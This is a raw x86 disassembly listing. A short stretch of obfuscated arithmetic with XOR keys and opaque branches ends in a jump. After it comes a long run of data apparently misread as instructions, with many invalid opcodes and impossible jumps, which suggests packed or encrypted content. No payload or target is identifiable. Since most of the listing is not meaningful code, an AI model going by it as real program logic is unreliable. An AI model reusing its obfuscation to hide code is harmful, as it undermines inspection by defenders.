  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	push   esp
  41424d:	scas   eax,DWORD PTR es:[edi]
  41424e:	fwait
  41424f:	dec    ecx
  414250:	jge    0x414298
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	xchg   edi,eax
  414259:	std    
  41425a:	inc    esi
  41425b:	ins    DWORD PTR es:[edi],dx
  41425c:	leave  
  41425d:	dec    edx
  41425e:	jecxz  0x4141ea
  414260:	jno    0x4141ee
  414262:	dec    ebp
  414263:	sbb    BYTE PTR [eax-0x484b6ab0],dl
  414269:	xchg   esi,eax
  41426a:	cmp    ebp,DWORD PTR [edx+0x518ecd88]
  414270:	or     al,0xdc
  414272:	icebp  
  414273:	mov    ah,0xb5
  414275:	in     eax,dx
  414276:	(bad)  
  414277:	in     al,0x41
  414279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41427a:	cmp    al,0x10
  41427c:	ror    bh,1
  41427e:	sbb    al,0x94
  414280:	cwde   
  414281:	aas    
  414282:	dec    ecx
  414283:	and    BYTE PTR [esi-0x7b4b0afa],0x90
  41428a:	jae    0x4142e4
  41428c:	imul   esi,DWORD PTR [ebp-0xb],0xffffffca
  414290:	ja     0x414220
  414292:	xchg   edi,eax
  414293:	mov    cl,0xa8
  414295:	stos   DWORD PTR es:[edi],eax
  414296:	jmp    0xf46:0xfe06e8ad
  41429d:	mov    BYTE PTR [eax+0x29],ah
  4142a0:	inc    ecx
  4142a1:	(bad)  
  4142a2:	(bad)  
  4142a3:	iret   
  4142a4:	or     eax,0xef982132
  4142a9:	and    BYTE PTR [ebp-0x469d271f],bl
  4142af:	test   BYTE PTR [edx-0x18ba337d],ch
  4142b5:	jmp    0x414312
  4142b7:	(bad)  
  4142b8:	jnp    0x414276
  4142ba:	jne    0x4142e2
  4142bc:	pusha  
  4142bd:	mov    esp,0xdb88330b
  4142c2:	int3   
  4142c3:	cwde   
  4142c4:	(bad)  
  4142c5:	cli    
  4142c6:	sbb    al,ah
  4142c8:	rcr    DWORD PTR [esi+0xeb27265],cl
  4142ce:	retf   0x1f38
  4142d1:	enter  0xb50d,0x82
  4142d5:	ins    DWORD PTR es:[edi],dx
  4142d6:	out    dx,al
  4142d7:	sar    DWORD PTR [esi-0x12ea6939],cl
  4142dd:	sub    eax,0x37e55ce
  4142e2:	xchg   edi,eax
  4142e3:	(bad)  [ebp-0x50]
  4142e6:	cmp    al,0x48
  4142e8:	add    bl,0xdb
  4142eb:	sbb    ecx,DWORD PTR [edx+0x5ef94a]
  4142f1:	popa   
  4142f2:	aas    
  4142f3:	and    BYTE PTR [si+0x4bb7],bl
  4142f8:	push   0x6a
  4142fa:	cmp    al,0x28
  4142fc:	mov    edx,0x123dfe3d
  414301:	div    esi
  414303:	mov    ebx,0x193dbba0
  414308:	jns    0x4142c0
  41430a:	jb     0x41435f
  41430c:	scas   eax,DWORD PTR es:[edi]
  41430d:	cmp    al,0x84
  41430f:	sub    ecx,edx
  414311:	out    0x43,al
  414313:	xchg   esp,eax
  414314:	call   0x8d437e2c
  414319:	retf   
  41431a:	inc    ecx
  41431b:	not    bl
  41431d:	add    ebx,ecx
  41431f:	scas   al,BYTE PTR es:[edi]
  414320:	push   cs
  414321:	and    BYTE PTR [ecx+esi*4-0x5c9d9cc1],ch
  414328:	ret    
  414329:	cli    
  41432a:	pop    es
  41432b:	mov    ebp,0x9df466c
  414330:	into   
  414331:	cmp    esp,edx
  414333:	lds    ebx,FWORD PTR [edx]
  414335:	fs inc edx
  414337:	pop    ds
  414338:	pop    ebp
  414339:	adc    ecx,DWORD PTR [esp+eax*8]
  41433c:	cmp    BYTE PTR [ebp+eax*1-0x59],ch
  414340:	jl     0x41435e
  414342:	xor    cl,0xb9
  414345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414346:	pushf  
  414347:	mov    ch,BYTE PTR [edi+0x72]
  41434a:	xchg   ah,cl
  41434c:	inc    edi
  41434d:	shl    BYTE PTR [ebx],cl
  41434f:	icebp  
  414350:	aas    
  414351:	and    ecx,DWORD PTR [ebp-0x73]
  414354:	test   BYTE PTR [ebx+0x46aaf77c],0xd4
  41435b:	not    ebp
  41435d:	ret    
  41435e:	pushf  
  41435f:	popa   
  414360:	(bad)  
  414361:	sbb    DWORD PTR [edi+0x76867958],esi
  414367:	mov    dl,0xe0
  414369:	or     dh,BYTE PTR [ecx]
  41436b:	inc    ebp
  41436c:	mov    ah,0xac
  41436e:	stos   BYTE PTR es:[edi],al
  41436f:	je     0x414388
  414371:	push   0xffffffa6
  414373:	js     0x41432d
  414375:	inc    ebp
  414376:	add    eax,0x11d7bcaf
  41437b:	fbld   TBYTE PTR [ebp+0x123337de]
  414381:	mov    edi,0xc960eba9
  414386:	jmp    0x982b54c
  41438b:	jnp    0x4143ec
  41438d:	outs   dx,DWORD PTR ds:[esi]
  41438e:	jl     0x41440e
  414390:	mov    cl,ch
  414392:	mov    ds:0xb827a9cc,eax
  414397:	mov    ecx,0x9e6f98ae
  41439c:	xchg   DWORD PTR [eax+0x1380e57e],ebx
  4143a2:	in     al,dx
  4143a3:	fstp   st(0)
  4143a5:	jmp    0x7361bcc9
  4143aa:	mov    dl,0x38
  4143ac:	cs loope 0x414340
  4143af:	xchg   esp,ebx
  4143b1:	mov    BYTE PTR cs:[esi],bh
  4143b4:	in     eax,dx
  4143b5:	(bad)  
  4143b6:	fld    TBYTE PTR [eax-0x76]
  4143b9:	mov    eax,ds:0xc85fe15f
  4143be:	cmp    ebx,DWORD PTR [edx-0x2]
  4143c1:	ins    BYTE PTR es:[edi],dx
  4143c2:	xor    ebx,DWORD PTR [esi]
  4143c4:	inc    esi
  4143c5:	ins    DWORD PTR es:[edi],dx
  4143c6:	or     BYTE PTR ds:0x158c259d,dl
  4143cc:	push   eax
  4143cd:	ja     0x414404
  4143cf:	fsub   QWORD PTR [ebx+ebp*2]
  4143d2:	xchg   esi,eax
  4143d3:	cmp    bh,BYTE PTR [edx-0x4f]
  4143d6:	in     eax,0xee
  4143d8:	in     eax,dx
  4143d9:	mov    ecx,0x94667562
  4143de:	mov    ds:0xb307b2ad,al
  4143e3:	jb     0x4143d4
  4143e5:	mov    eax,ds:0x3b4527e
  4143ea:	ficomp DWORD PTR [ebx+0x36e30d3e]
  4143f0:	hlt    
  4143f1:	daa    
  4143f2:	aaa    
  4143f3:	(bad)  
  4143f4:	xchg   ecx,eax
  4143f5:	xchg   esp,eax
  4143f6:	into   
  4143f7:	dec    eax
  4143f8:	jmp    ecx
  4143fa:	adc    al,0x7d
  4143fc:	out    0xb5,al
  4143fe:	mov    edx,esi
  414400:	xchg   BYTE PTR [ebp-0x4ce208d9],dh
  414406:	cli    
  414407:	cmp    DWORD PTR [esi-0x3b],ebp
  41440a:	out    0x19,eax
  41440c:	cli    
  41440d:	or     esp,edx
  41440f:	lock mov ?,WORD PTR [esi+0x59306ada]
  414416:	dec    edi
  414417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414418:	mov    cl,0x5b
  41441a:	cmp    edi,DWORD PTR [edx+0x1]
  41441d:	sahf   
  41441e:	loopne 0x414475
  414420:	jae    0x4143e3
  414422:	ror    ecx,cl
  414424:	fcom   QWORD PTR [eax+edx*2+0x330516d8]
  41442b:	or     al,0x48
  41442d:	mov    cl,0x1a
  41442f:	mov    esp,0x79a576f6
  414434:	fwait
  414435:	add    DWORD PTR [edi+ebp*4+0x1db451ae],eax
  41443c:	and    al,0xdd
  41443e:	fimul  DWORD PTR ds:0x4e44e512
  414444:	loopne 0x41447c
  414446:	rep outs dx,DWORD PTR ds:[esi]
  414448:	jmp    0x41442d
  41444a:	mov    ds:0xfb1e9d43,al
  41444f:	add    ah,BYTE PTR [edx]
  414451:	div    DWORD PTR [ebp+0x53bd2622]
  414457:	ins    DWORD PTR es:[edi],dx
  414458:	mov    DWORD PTR ds:0xbce13006,ecx
  41445e:	das    
  41445f:	ret    
  414460:	add    cl,BYTE PTR [edi]
  414462:	xor    bh,BYTE PTR [ebp-0x62]
  414465:	push   ds
  414466:	mov    al,ds:0x1bce472c
  41446b:	in     al,0x9f
  41446d:	push   0xd30d7940
  414472:	fwait
  414473:	stos   DWORD PTR es:[edi],eax
  414474:	loop   0x4143f8
  414476:	(bad)  
  414477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414478:	cmp    DWORD PTR [edi],0x9f86c41c
  41447e:	add    BYTE PTR [esi+0x5ba34d26],dh
  414484:	lds    edi,FWORD PTR [edx+ebx*1-0x6e3f9e02]
  41448b:	xchg   esi,eax
  41448c:	outs   dx,DWORD PTR ds:[esi]
  41448d:	je     0x4144cc
  41448f:	std    
  414490:	add    cl,BYTE PTR [esi-0x58]
  414493:	jno    0x41441a
  414495:	or     eax,esp
  414497:	jmp    DWORD PTR [esp+ebx*1]
  41449a:	sub    eax,0xd2eff215
  41449f:	and    dl,BYTE PTR [edi+0x73e0d16]
  4144a5:	in     al,0x75
  4144a7:	push   esp
  4144a8:	sbb    DWORD PTR [ebx+0x7a],0x5c
  4144ac:	jb     0x414500
  4144ae:	in     eax,0xb9
  4144b0:	mov    al,0x54
  4144b2:	jge    0x4144c8
  4144b4:	mul    DWORD PTR [eax-0x27]
  4144b7:	jns    0x4144a2
  4144b9:	mov    ebx,0x3d318065
  4144be:	cwde   
  4144bf:	add    dl,dl
  4144c1:	iret   
  4144c2:	mov    db4,edx
  4144c5:	repnz cs lahf 
  4144c8:	out    0x3e,eax
  4144ca:	clc    
  4144cb:	ja     0x414532
  4144cd:	mov    esp,0x96803ddf
  4144d2:	mov    ds:0x7a3fa491,eax
  4144d7:	cld    
  4144d8:	adc    al,BYTE PTR [ebx+0x6d]
  4144db:	jle    0x414509
  4144dd:	int    0x2a
  4144df:	retf   0x379
  4144e2:	lahf   
  4144e3:	fs ss retf 0xfc92
  4144e8:	nop
  4144e9:	cmp    BYTE PTR [edi+0xe890e05],dl
  4144ef:	xor    eax,0x8cf046a8
  4144f4:	sbb    BYTE PTR [edi],0x4f
  4144f7:	ret    
  4144f8:	test   eax,0x4d5d074b
  4144fd:	pop    esp
  4144fe:	mov    ecx,0xdee2221a
  414503:	xchg   esp,eax
  414504:	adc    eax,DWORD PTR [ebx-0x6eee2037]
  41450a:	sub    BYTE PTR [ebp+0x7ad4e0eb],dl
  414510:	xor    DWORD PTR [ebx],0xf553d170
  414516:	xor    ebp,DWORD PTR [edi]
  414518:	test   DWORD PTR [ebp+0x6d],ebx
  41451b:	out    0xd9,al
  41451d:	add    eax,esp
  41451f:	xor    DWORD PTR [ecx-0x6b],ecx
  414522:	loopne 0x4144fb
  414524:	gs jne 0x414523
  414527:	xchg   ebx,eax
  414528:	inc    ebx
  414529:	(bad)  
  41452a:	pop    esp
  41452b:	push   es
  41452c:	xchg   esi,eax
  41452d:	inc    ecx
  41452e:	add    al,0xdb
  414530:	test   al,0x60
  414532:	mov    ebp,0xb6f80505
  414537:	mov    cl,BYTE PTR [edi]
  414539:	les    esi,FWORD PTR [eax-0x59640574]
  41453f:	icebp  
  414540:	cmp    dl,BYTE PTR [eax]
  414542:	(bad)  
  414543:	xor    BYTE PTR [ebp-0x2b],dl
  414546:	push   edx
  414547:	jge    0x4145a5
  414549:	cmp    DWORD PTR [ecx+eiz*4-0x3351f374],esi
  414550:	shl    DWORD PTR [ebp+0x31],0x67
  414554:	jno    0x41454a
  414556:	or     eax,DWORD PTR [ecx+0x7f]
  414559:	fstp   TBYTE PTR ds:0x6b9593e2
  41455f:	mov    eax,ds:0x23a82596
  414564:	ins    DWORD PTR es:[edi],dx
  414565:	xchg   esp,eax
  414566:	(bad)  
  414567:	enter  0x4678,0x6b
  41456b:	mov    ds:0x690a56b6,al
  414570:	inc    edi
  414571:	aam    0x82
  414573:	xor    BYTE PTR [ebx],dl
  414575:	jecxz  0x41459d
  414577:	ret    0x197d
  41457a:	fld    st(0)
  41457c:	xchg   edi,eax
  41457d:	lods   eax,DWORD PTR ds:[esi]
  41457e:	dec    edi
  41457f:	out    0x17,al
  414581:	int3   
  414582:	jae    0x414600
  414584:	mov    ecx,0xf7d871e7
  414589:	mov    edx,0xd2eae6bd
  41458e:	push   es
  41458f:	mov    ds:0xfe8d360e,al
  414594:	ror    BYTE PTR [eax],cl
  414596:	push   es
  414597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414598:	scas   al,BYTE PTR es:[edi]
  414599:	xor    bh,bh
  41459b:	fxch   st(1)
  41459d:	cli    
  41459e:	mov    bl,BYTE PTR [ecx]
  4145a0:	or     DWORD PTR [edi+0x2857fc7d],edi
  4145a6:	xor    eax,DWORD PTR ds:0x76bf1d6c
  4145ac:	mov    DWORD PTR [edx-0x2eb5dd37],0xbd3c87ba
  4145b6:	sbb    dl,BYTE PTR [ebx+edx*4+0x14]
  4145ba:	aaa    
  4145bb:	daa    
  4145bc:	adc    cl,dl
  4145be:	or     eax,0x909236ed
  4145c3:	cmp    BYTE PTR gs:[edi+ebp*1+0x599c2f7c],bh
  4145cb:	jle    0x414576
  4145cd:	fmul   st(2),st
  4145cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145d0:	(bad)  
  4145d1:	rol    BYTE PTR [esi+0x769576dd],0xde
  4145d8:	pop    esi
  4145d9:	in     al,dx
  4145da:	jg     0x4145d0
  4145dc:	ins    BYTE PTR es:[edi],dx
  4145dd:	dec    edi
  4145de:	inc    edx
  4145df:	shl    BYTE PTR [edx],cl
  4145e1:	jns    0x414617
  4145e3:	outs   dx,DWORD PTR ds:[esi]
  4145e4:	mov    edi,0x180d81eb
  4145e9:	cld    
  4145ea:	fst    QWORD PTR [edx-0xf6cc6b0]
  4145f0:	mov    edi,0x7b47adea
  4145f5:	dec    ebx
  4145f6:	(bad)  
  4145f7:	cmp    ebp,DWORD PTR [ecx-0x40]
  4145fa:	fisubr WORD PTR ds:0xfdf7a5f9
  414600:	xchg   edx,eax
  414601:	jge    0x414666
  414603:	in     al,dx
  414604:	ret    0x9ed6
  414607:	addr16 mov ebx,0xed534da7
  41460d:	aaa    
  41460e:	ret    0x4fc2
  414611:	ja     0x4145b9
  414613:	or     ebp,DWORD PTR [ebx-0x3dcd809c]
  414619:	push   cs
  41461a:	mov    al,ds:0xd07144c6
  41461f:	inc    ecx
  414620:	mov    ebp,0x16ead0f6
  414625:	aad    0xd0
  414627:	das    
  414628:	bound  ebp,QWORD PTR [ecx+0x1b]
  41462b:	pushf  
  41462c:	or     DWORD PTR [eax-0x15],ebp
  41462f:	pusha  
  414630:	jg     0x41465a
  414632:	retf   
  414633:	adc    ecx,DWORD PTR [eax+0x23]
  414636:	add    esp,eax
  414638:	pop    ebx
  414639:	(bad)  
  41463a:	leave  
  41463b:	daa    
  41463c:	pop    ebx
  41463d:	les    ebx,FWORD PTR ds:0x74746feb
  414643:	mov    bh,BYTE PTR [ecx+0x43]
  414646:	push   esp
  414647:	in     al,0x79
  414649:	hlt    
  41464a:	sub    eax,0xd147a255
  41464f:	dec    edi
  414650:	xor    eax,0x711adc33
  414655:	arpl   WORD PTR [esi+0x656746bc],dx
  41465b:	mov    ch,0x1b
  41465d:	pop    eax
  41465e:	and    esp,DWORD PTR [esi+0x20011705]
  414664:	in     eax,dx
  414665:	push   es
  414666:	add    esi,esi
  414668:	into   
  414669:	lods   eax,DWORD PTR ds:[esi]
  41466a:	pop    esi
  41466b:	into   
  41466c:	retf   0xfc80
  41466f:	push   esi
  414670:	add    dh,BYTE PTR [ecx+0x19ccb9d5]
  414676:	faddp  st(5),st
  414678:	aas    
  414679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41467a:	int    0xfb
  41467c:	out    0x1,al
  41467e:	or     dx,WORD PTR [eax-0x1be7ab02]
  414685:	sub    al,0x17
  414687:	sbb    dh,BYTE PTR [edi]
  414689:	mov    bh,ah
  41468b:	scas   eax,DWORD PTR es:[edi]
  41468c:	sub    DWORD PTR [esi],0xffffff93
  41468f:	xchg   DWORD PTR [eax+0x16],ebx
  414692:	push   cs
  414693:	loop   0x414671
  414695:	mov    cl,0xf4
  414697:	xor    edx,DWORD PTR [ebp-0xd]
  41469a:	retf   0xe999
  41469d:	stc    
  41469e:	jnp    0x414635
  4146a0:	scas   eax,DWORD PTR es:[edi]
  4146a1:	push   ecx
  4146a2:	fcmovbe st,st(4)
  4146a4:	jnp    0x414640
  4146a6:	push   esp
  4146a7:	shl    DWORD PTR ds:0xf3a72ea9,1
  4146ad:	push   es
  4146ae:	scas   eax,DWORD PTR es:[edi]
  4146af:	in     al,dx
  4146b0:	fisub  DWORD PTR [edi-0x4d1e290a]
  4146b6:	daa    
  4146b7:	push   esp
  4146b8:	ja     0x414661
  4146ba:	iret   
  4146bb:	inc    edx
  4146bc:	popa   
  4146bd:	(bad)  
  4146be:	push   ebp
  4146bf:	sub    eax,0xe1d3dfaf
  4146c4:	sub    eax,0x82c45541
  4146c9:	(bad)  
  4146cb:	pop    ecx
  4146cc:	inc    eax
  4146cd:	test   BYTE PTR [esi],dl
  4146cf:	cmp    bh,dh
  4146d1:	scas   al,BYTE PTR es:[edi]
  4146d2:	and    BYTE PTR [ecx+0x37a8ef5c],bl
  4146d8:	test   DWORD PTR [ebx-0x7533a66c],esi
  4146de:	or     eax,0xad1410f2
  4146e3:	mov    DWORD PTR [edi],esp
  4146e5:	(bad)  [esp+edi*8]
  4146e8:	mov    ebx,0xefcfd5a
  4146ed:	ja     0x4146f8
  4146ef:	loop   0x41476d
  4146f1:	mov    ah,0x93
  4146f3:	jo     0x4146e8
  4146f5:	mov    edx,0x3df8c04e
  4146fa:	pop    esi
  4146fb:	mov    ebx,0x3dedbadd
  414700:	arpl   WORD PTR [ecx*8+0x793897f1],sp
  414707:	mov    cl,0x70
  414709:	jecxz  0x414719
  41470b:	pop    ebx
  41470c:	sbb    BYTE PTR [esi],0xa6
  41470f:	cli    
  414710:	aam    0x6b
  414712:	add    DWORD PTR [ebx-0x3bdf9bde],0x6d
  414719:	inc    ebx
  41471a:	pop    edx
  41471b:	imul   ebp,DWORD PTR [ecx],0x60
  41471e:	cs test ecx,0x8a723cd4
  414725:	fucomip st,st(4)
  414727:	in     al,0x4d
  414729:	and    BYTE PTR [edi+0xc2267a8],ch
  41472f:	out    0xb,al
  414731:	pop    esi
  414732:	arpl   WORD PTR [edx+0x5dd6b8e6],dx
  414738:	in     eax,dx
  414739:	xor    eax,0x3a733182
  41473e:	in     eax,0xa9
  414740:	dec    eax
  414741:	cld    
  414742:	mov    WORD PTR [edi-0xda07a06],?
  414748:	push   ecx
  414749:	push   cs
  41474a:	test   esi,ebp
  41474c:	ss push ds
  41474e:	jo     0x414704
  414750:	in     al,dx
  414751:	mov    al,ds:0x672c391
  414756:	sbb    esi,DWORD PTR [edx]
  414758:	add    DWORD PTR [ecx+0x62bc1dfa],0x1a502548
  414762:	pop    edi
  414763:	ds jg  0x414724
  414766:	jmp    0x414790
  414768:	jmp    0x414770
  41476a:	out    0x7e,al
  41476c:	or     BYTE PTR [edx+0x5976259c],dh
  414772:	dec    ebp
  414773:	stos   DWORD PTR es:[edi],eax
  414774:	loop   0x414767
  414776:	test   eax,0x56960c6d
  41477b:	sub    BYTE PTR [edi],ch
  41477d:	bound  ecx,QWORD PTR [eax+edi*2-0x5a]
  414781:	add    al,0xc0
  414783:	stos   BYTE PTR es:[edi],al
  414784:	enter  0x17a6,0xd7
  414788:	push   cs
  414789:	xchg   esi,eax
  41478a:	cld    
  41478b:	mov    ah,bh
  41478d:	je     0x41480e
  41478f:	sti    
  414790:	push   ds
  414791:	mov    esi,0xbd9cb92e
  414796:	out    0xc2,eax
  414798:	inc    ebp
  414799:	push   ss
  41479a:	or     edi,ecx
  41479c:	popf   
  41479d:	pop    ebp
  41479e:	test   al,0x5d
  4147a0:	icebp  
  4147a1:	imul   eax,DWORD PTR [ecx+edi*2],0xddc33efb
  4147a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147a9:	inc    ecx
  4147aa:	mov    WORD PTR [ebp-0x5e],fs
  4147ad:	pop    eax
  4147ae:	or     DWORD PTR [edx+0x6ea68c3],ebx
  4147b4:	push   ecx
  4147b5:	or     eax,0x997751f
  4147ba:	(bad)  
  4147bb:	sbb    DWORD PTR [ecx],ebx
  4147bd:	push   eax
  4147be:	aaa    
  4147bf:	add    al,0xc9
  4147c1:	ret    0x3004
  4147c4:	inc    ecx
  4147c5:	sub    DWORD PTR [eax],ebp
  4147c7:	cdq    
  4147c8:	stc    
  4147c9:	mov    dh,0x64
  4147cb:	and    al,0x54
  4147cd:	jo     0x4147c0
  4147cf:	mov    eax,ds:0xa5e14324
  4147d4:	ins    BYTE PTR es:[edi],dx
  4147d5:	add    dh,bl
  4147d7:	cmp    BYTE PTR [edx-0x30446038],0x93
  4147de:	push   esi
  4147df:	loopne 0x4147bf
  4147e1:	scas   eax,DWORD PTR es:[edi]
  4147e2:	out    dx,eax
  4147e3:	in     al,0x34
  4147e5:	retf   
  4147e6:	sbb    DWORD PTR [edx+eax*8+0x62],0xffffffba
  4147eb:	jae    0x414856
  4147ed:	mov    ds:0x48db292e,al
  4147f2:	rol    BYTE PTR [ebp+0x5e4a1599],cl
  4147f8:	cmc    
  4147f9:	inc    eax
  4147fa:	mov    ebx,DWORD PTR [ebx]
  4147fc:	das    
  4147fd:	scas   eax,DWORD PTR es:[edi]
  4147fe:	add    eax,DWORD PTR [edi+edi*1]
  414801:	pop    esi
  414802:	in     al,dx
  414803:	sub    al,0x8f
  414805:	xchg   esp,eax
  414806:	dec    edi
  414807:	push   esp
  414808:	push   edi
  414809:	push   cs
  41480a:	arpl   WORD PTR [ebx-0xa],sp
  41480d:	mov    ds:0xfab8c8fe,eax
  414812:	mov    esp,0x99a49817
  414817:	pop    ebx
  414818:	inc    ebp
  414819:	xchg   edx,eax
  41481a:	adc    al,0xa7
  41481c:	inc    ecx
  41481d:	cmp    BYTE PTR [ebx],al
  41481f:	and    DWORD PTR [eax-0x361ef703],edi
  414825:	push   0x438dc8d0
  41482a:	and    DWORD PTR [eax+esi*1+0x5ab5e216],ebp
  414831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414832:	mov    ah,BYTE PTR [esi-0x6c]
  414835:	sbb    eax,0x8feb4639
  41483a:	sbb    ah,BYTE PTR [ebp+0x624470a8]
  414840:	pop    ecx
  414841:	inc    edx
  414842:	lock pop es
  414844:	in     al,dx
  414845:	daa    
  414846:	inc    edi
  414847:	push   ecx
  414848:	into   
  414849:	sbb    al,0x6b
  41484b:	cmp    BYTE PTR [edi-0x2a74e604],bh
  414851:	add    eax,ecx
  414853:	inc    ebp
  414854:	ins    BYTE PTR es:[edi],dx
  414855:	xchg   edx,eax
  414856:	loopne 0x414859
  414858:	push   edi
  414859:	test   eax,0xce826f71
  41485e:	push   es
  41485f:	ret    0xfec1
  414862:	fsubp  st(3),st
  414864:	(bad)  [edi]
  414866:	push   0xdd7ff798
  41486b:	fidivr WORD PTR [ebx+0x11]
  41486e:	mov    al,0x1
  414870:	cld    
  414871:	pusha  
  414872:	push   eax
  414873:	mov    al,ds:0xcbe93e8c
  414878:	jno    0x41484f
  41487a:	or     dl,al
  41487c:	ins    BYTE PTR es:[edi],dx
  41487d:	out    0xde,eax
  41487f:	shr    DWORD PTR [esi],1
  414881:	mov    ebx,0x3cd8737c
  414886:	mov    al,0x99
  414888:	or     eax,0x70da785b
  41488d:	stos   BYTE PTR es:[edi],al
  41488e:	out    dx,eax
  41488f:	ret    
  414890:	mov    WORD PTR [esi-0x4aa120ad],gs
  414896:	adc    eax,0x6f9a2de7
  41489b:	jl     0x414889
  41489d:	push   0xa75586c2
  4148a2:	jle    0x41491e
  4148a4:	push   edi
  4148a5:	sbb    ebx,DWORD PTR [eax-0x4e]
  4148a8:	popf   
  4148a9:	jle    0x41484a
  4148ab:	cmc    
  4148ac:	call   0x7186027d
  4148b1:	sbb    eax,0x4946e38c
  4148b6:	xchg   edi,eax
  4148b7:	repz fsub st,st(1)
  4148ba:	xlat   BYTE PTR ds:[ebx]
  4148bb:	(bad)  
  4148bc:	adc    DWORD PTR [esi],ebp
  4148be:	pop    esp
  4148bf:	sbb    eax,0xa2f7d5ba
  4148c4:	retf   0xef18
  4148c7:	jno    0x414916
  4148c9:	jp     0x414872
  4148cb:	retf   
  4148cc:	add    eax,ecx
  4148ce:	lds    esi,FWORD PTR [edi]
  4148d0:	jbe    0x41487f
  4148d2:	das    
  4148d3:	outs   dx,DWORD PTR ds:[esi]
  4148d4:	dec    ecx
  4148d5:	sbb    edx,ecx
  4148d7:	push   es
  4148d8:	jne    0x414920
  4148da:	call   0x8e475de8
  4148df:	dec    esp
  4148e0:	call   0x3bcc0fb5
  4148e5:	mov    bh,0xe7
  4148e7:	gs mov esi,0x829cbf69
  4148ed:	pop    es
  4148ee:	lock push 0x92dc6b89
  4148f4:	lahf   
  4148f5:	push   eax
  4148f6:	clc    
  4148f7:	push   ebp
  4148f8:	sti    
  4148f9:	dec    esp
  4148fa:	inc    ecx
  4148fb:	mov    esp,0x703d5b50
  414900:	push   0x6b
  414902:	dec    esp
  414903:	scas   al,BYTE PTR es:[edi]
  414904:	mov    ebp,0xbb3fc49b
  414909:	fwait
  41490a:	sar    DWORD PTR [eax+0x13],1
  41490d:	dec    esi
  41490e:	ins    DWORD PTR es:[edi],dx
  41490f:	test   BYTE PTR [ebx],al
  414911:	push   0x3b
  414913:	aaa    
  414914:	jno    0x4148a2
  414916:	xchg   esp,eax
  414917:	jno    0x4148c4
  414919:	pushf  
  41491a:	loopne 0x414924
  41491c:	fwait
  41491d:	cmp    eax,0xf921ed40
  414922:	adc    eax,DWORD PTR [ebx]
  414924:	mov    al,ds:0xb6d726b9
  414929:	xor    BYTE PTR [ebx+0x5c5d7aee],ah
  41492f:	sub    DWORD PTR [eax-0x4545d1f2],eax
  414935:	add    bh,BYTE PTR [eax]
  414937:	mul    edx
  414939:	mov    dh,0x1f
  41493b:	mov    bl,0x2f
  41493d:	or     DWORD PTR [edx+0x48],eax
  414940:	push   edx
  414941:	mov    ebx,0xce2858e1
  414946:	pop    ds
  414947:	in     eax,0xed
  414949:	dec    eax
  41494a:	xchg   DWORD PTR [ecx-0x3cc66bc4],ebx
  414950:	mov    ds,WORD PTR [ebx+0x1ac63af6]
  414956:	(bad)  
  414957:	jp     0x41499e
  414959:	sub    edi,edi
  41495b:	test   BYTE PTR [edx+0x1f],al
  41495e:	vcmpsd xmm4,xmm7,QWORD PTR [ecx],0x46
  414963:	adc    al,0x34
  414965:	outs   dx,DWORD PTR ds:[esi]
  414966:	mov    ds:0x69b5d430,eax
  41496b:	lahf   
  41496c:	push   0xc1c0fc6a
  414971:	cmp    bl,BYTE PTR [ebx+eax*2-0x2704964d]
  414978:	mov    ds:0xb7ea4be8,al
  41497d:	jno    0x414938
  41497f:	dec    edi
  414980:	mov    ebp,0xe66f3761
  414985:	jmp    0xb06cb548
  41498a:	gs ins DWORD PTR es:[edi],dx
  41498c:	pop    esi
  41498d:	sbb    al,0x58
  41498f:	aam    0xb9
  414991:	out    0x2c,eax
  414993:	bound  esi,QWORD PTR es:[edi]
  414996:	out    dx,al
  414997:	lock loopne 0x4149ce
  41499a:	fisttp QWORD PTR [ebx+0xe]
